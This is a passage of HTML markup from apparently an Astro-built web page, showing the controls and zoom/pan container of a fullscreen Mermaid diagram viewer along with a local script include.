values="24;0"></animate> </path> <path d="M7.5 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" begin="0.4s" dur="0.4s" values="24;0"></animate> </path> </g> </mask> <rect width="24" height="24" fill="currentColor" mask="url(#checkmark-anim-mermaid-fullscreen)"></rect> </svg> <span id="mermaid-fullscreen-copy-text" class="text-sm">Copy</span> </button> <!-- Close button --> <button id="mermaid-fullscreen-close" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground rounded-md p-2 transition-colors" aria-label="Close"> <i class="fa-solid fa-xmark text-base" aria-hidden="true"></i> </button> </div> </div> <!-- SVG Container with zoom/pan --> <div id="mermaid-fullscreen-viewport" class="flex flex-1 cursor-grab items-center justify-center overflow-hidden active:cursor-grabbing"> <div id="mermaid-fullscreen-svg" class="mermaid-svg-container origin-center transition-transform duration-100"></div> </div> </div> </div> <script type="module" src="/_astro/MermaidFullscreen.astro_astro_type_script_index_0_lang.DIkgBJYA.js"></script> </div> </body></html>